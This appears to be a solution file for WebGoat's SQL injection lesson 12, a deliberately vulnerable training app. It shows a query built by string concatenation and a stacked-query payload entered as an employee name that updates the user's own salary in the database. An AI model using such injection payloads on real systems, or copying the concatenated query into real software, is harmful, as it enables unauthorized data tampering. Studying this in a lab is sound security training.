-- WEBGOAT SQL injection(intro) 12.


-- You just found out that Tobi and Bob both seem to earn more money than you! Of course you cannot leave it at that.
-- Better go and change your own salary so you are earning the most!

-- Remember: Your name is John Smith and your current TAN is 3SL99A.


"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'";
--Employee Name: '; UPDATE employees SET SALARY = 9999999 WHERE AUTH_TAN = '3SL99A' --
--Authentication TAN: